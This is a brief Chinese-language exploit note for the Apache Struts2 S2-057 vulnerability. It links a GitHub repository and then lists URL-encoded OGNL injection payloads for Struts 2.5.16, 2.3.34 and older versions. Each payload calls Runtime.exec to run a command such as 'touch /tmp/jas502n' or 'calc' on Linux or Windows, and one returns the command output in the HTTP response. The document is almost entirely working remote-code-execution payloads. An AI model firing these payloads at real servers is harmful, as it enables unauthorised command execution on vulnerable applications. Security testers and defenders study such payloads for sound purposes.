参考链接
https://github.com/jas502n/St2-057



通用poc
```
http://www.canyouseeme.cc:8080/struts2-showcase/${(111+111)}/actionChain1.action
```

struts版本2.5.16
```
linux
http://www.canyouseeme.cc:44449/struts2-showcase/actionchaining/$%7B(%23ct=%23request['struts.valueStack'].context).(%23cr=%23ct['com.opensymphony.xwork2.ActionContext.container']).(%23ou=%23cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ou.setExcludedClasses('java.lang.Shutdown')).(%23ou.setExcludedPackageNames('sun.reflect.')).(%23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23ct.setMemberAccess(%23dm)).(%23cmd=@java.lang.Runtime@getRuntime().exec('touch /tmp/jas502n'))%7D/actionChain1.action

```

st2版本2.3.34

```
http://192.168.44.1:8080/struts2-showcase/%24%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3d%23request%5b%27struts.valueStack%27%5d.context).(%23cr%3d%23ct%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ou%3d%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd%3d%40java.lang.Runtime%40getRuntime().exec(%22calc%22))%7d/actionChain1.action
```

低版本的st2

```
windows:
http://127.0.0.1:8080/struts3-showcase/%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec('calc').getInputStream()%2c%23b%3dnew%20java.io.InputStreamReader(%23a)%2c%23c%3dnew %20java.io.BufferedReader(%23b)%2c%23d%3dnew%20char%5b51020%5d%2c%23c.read(%23d)%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23sbtest.println(%23d)%2c%23sbtest.close())%7d/actionChain1.action

linux:
http://www.canyouseeme.cc/struts3-showcase/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27touch /tmp/jas502n%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action
```



